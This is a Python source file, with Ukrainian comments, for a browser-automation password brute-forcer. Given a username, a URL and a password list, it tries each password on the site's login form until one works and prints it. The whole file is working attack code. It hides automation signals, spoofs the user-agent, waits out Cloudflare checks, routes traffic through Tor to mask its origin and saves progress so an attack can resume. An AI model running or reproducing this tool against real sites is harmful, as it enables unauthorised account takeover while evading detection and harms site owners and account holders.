from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementNotInteractableException
import undetected_chromedriver as uc
import time
import argparse
from stem import Signal
from stem.control import Controller
import requests
import json
import os

class StateManager:
    def __init__(self, state_file='login_state.json'):
        self.state_file = state_file
        self.state = self.load_state()

    def load_state(self):
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    return json.load(f)
            except json.JSONDecodeError:
                return self.get_default_state()
        return self.get_default_state()

    def get_default_state(self):
        return {
            'last_password_index': 0,
            'successful_password': None,
            'settings': {
                'tor_enabled': False,
                'cloudflare_enabled': False,
                'max_attempts': 3,
                'url': '',
                'login': ''
            }
        }

    def save_state(self):
        with open(self.state_file, 'w') as f:
            json.dump(self.state, f, indent=4)

    def update_progress(self, password_index):
        self.state['last_password_index'] = password_index
        self.save_state()

    def update_settings(self, settings):
        self.state['settings'].update(settings)
        self.save_state()

    def set_successful_password(self, password):
        self.state['successful_password'] = password
        self.save_state()

def check_ip():
    """Перевірка IP адреси через різні сервіси"""
    try:
        regular_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        print(f"Ваша звичайна IP адреса: {regular_ip}")
        
        session = requests.session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        tor_ip = session.get('https://api.ipify.org?format=json').json()['ip']
        print(f"IP адреса через Tor: {tor_ip}")
        
        tor_check = session.get('https://check.torproject.org/api/ip')
        if tor_check.json().get('IsTor', False):
            print("Підтверджено: з'єднання відбувається через Tor")
            return True
        else:
            print("Помилка: з'єднання не йде через Tor мережу!")
            return False
            
    except Exception as e:
        print(f"Помилка при перевірці IP: {e}")
        return False

def parse_arguments():
    parser = argparse.ArgumentParser(description='Універсальний інструмент для автоматичного логіну')
    parser.add_argument('-l', '--login', help='Логін користувача', required=True)
    parser.add_argument('-p', '--password-file', help='Файл з паролями', required=True)
    parser.add_argument('--url', help='URL сторінки логіну', required=True)
    parser.add_argument('--cloudflare', action='store_true', help='Режим обходу Cloudflare')
    parser.add_argument('--tor', action='store_true', help='Запуск через Tor мережу')
    parser.add_argument('--attempts', type=int, default=3, help='Кількість спроб для кожного пароля')
    parser.add_argument('--resume', action='store_true', help='Відновити з останнього збереженого стану')
    return parser.parse_args()

def setup_driver(use_tor=False, headless=True):
    options = uc.ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    if not headless:
        options.add_argument("--start-maximized")
    else:
        options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

    if use_tor:
        print("Перевірка з'єднання через Tor...")
        if not check_ip():
            raise Exception("Не вдалося встановити з'єднання через Tor")
        options.add_argument('--proxy-server=socks5://127.0.0.1:9050')

    return uc.Chrome(options=options)

def find_login_fields(driver):
    """Пошук полів для вводу логіну/email"""
    possible_selectors = [
        "input[type='email']",
        "input[name='email']",
        "input[id*='email']",
        "input[type='text']",
        "input[name='username']",
        "input[id*='username']",
        "input[id*='login']",
        "input[name='login']"
    ]
    
    for selector in possible_selectors:
        elements = driver.find_elements(By.CSS_SELECTOR, selector)
        if elements:
            return elements[0]
    return None

def find_password_field(driver):
    """Пошук поля для вводу пароля"""
    possible_selectors = [
        "input[type='password']",
        "input[name*='pass']",
        "input[id*='pass']"
    ]
    
    for selector in possible_selectors:
        elements = driver.find_elements(By.CSS_SELECTOR, selector)
        if elements:
            return elements[0]
    return None

def wait_for_cloudflare(driver):
    """Чекаємо поки сторінка не стане доступною"""
    while True:
        try:
            if not driver.find_elements(By.XPATH, "//*[contains(text(), 'Cloudflare') or contains(@class, 'cloudflare')]"):
                return True
            print("Очікування проходження Cloudflare перевірки...")
            time.sleep(0.5)
        except Exception:
            time.sleep(0.5)

def wait_for_element(driver, by, value, timeout=10):
    """Чекаємо поки елемент стане доступним"""
    try:
        element = WebDriverWait(driver, timeout).until(
            EC.element_to_be_clickable((by, value))
        )
        return element
    except TimeoutException:
        return None

def check_error_message(driver):
    """Перевіряємо наявність повідомлення про помилку"""
    common_error_texts = [
        "Invalid username or password",
        "Incorrect password",
        "Login failed",
        "Authentication failed",
        "Wrong password",
        "Invalid credentials"
    ]
    
    try:
        for error_text in common_error_texts:
            error = driver.find_elements(By.XPATH, f"//*[contains(text(), '{error_text}')]")
            if error:
                return True
        return False
    except NoSuchElementException:
        return False

def try_login(driver, login, password, original_url, max_attempts):
    """Спроба логіну з повторами при помилці"""
    for attempt in range(max_attempts):
        try:
            login_field = find_login_fields(driver)
            password_field = find_password_field(driver)
            
            if not login_field or not password_field:
                print(f"Помилка: поля логіну/пароля недоступні (спроба {attempt + 1}/{max_attempts})")
                continue
            
            login_field.clear()
            login_field.send_keys(login)
            
            password_field.clear()
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)
            
            time.sleep(1)

            if driver.current_url != original_url:
                print(f"\nУспішний логін!\nЛогін: {login}\nПароль: {password}")
                return True

            if check_error_message(driver):
                print(f"Невірний пароль: {password}")
                return False

        except ElementNotInteractableException:
            if attempt < max_attempts - 1:
                print(f"Елемент тимчасово недоступний, повторна спроба {attempt + 1}")
                time.sleep(0.5)
            else:
                print(f"Помилка: елемент залишається недоступним після {max_attempts} спроб")
                return False
                
        except Exception as e:
            print(f"Помилка при спробі логіну: {e}")
            if attempt < max_attempts - 1:
                time.sleep(0.5)
                continue
            return False

    return False

def read_passwords(password_file):
    with open(password_file, 'r') as file:
        return [line.strip() for line in file]

if __name__ == "__main__":
    args = parse_arguments()
    state_manager = StateManager()
    
    if args.resume:
        print("Відновлення попереднього сеансу...")
        start_index = state_manager.state['last_password_index']
        if state_manager.state['successful_password']:
            print(f"Знайдено успішний пароль з попереднього сеансу: {state_manager.state['successful_password']}")
            exit(0)
    else:
        start_index = 0
        state_manager.update_settings({
            'tor_enabled': args.tor,
            'cloudflare_enabled': args.cloudflare,
            'max_attempts': args.attempts,
            'url': args.url,
            'login': args.login
        })

    passwords = read_passwords(args.password_file)
    success = False

    driver = setup_driver(args.tor, not args.cloudflare)

    try:
        print(f"Підключення до сайту {args.url}...")
        driver.get(args.url)
        original_url = driver.current_url
        
        if args.cloudflare:
            print("Очікування проходження Cloudflare...")
            wait_for_cloudflare(driver)

        for i, password in enumerate(passwords[start_index:], start=start_index):
            print(f"Спроба логіну з паролем: {password}")
            if try_login(driver, args.login, password, original_url, args.attempts):
                success = True
                state_manager.set_successful_password(password)
                break
            
            state_manager.update_progress(i + 1)

    except KeyboardInterrupt:
        print("\nПрограму зупинено користувачем.")
        print(f"Останній перевірений пароль: {passwords[state_manager.state['last_password_index']]}")
    except Exception as e:
        print(f"Критична помилка: {e}")
    finally:
        if success:
            print(f"\nУспішний пароль: {state_manager.state['successful_password']}")
            input("\nНатисніть Enter для виходу...")
        driver.quit()
        print("Вихід з браузера.")
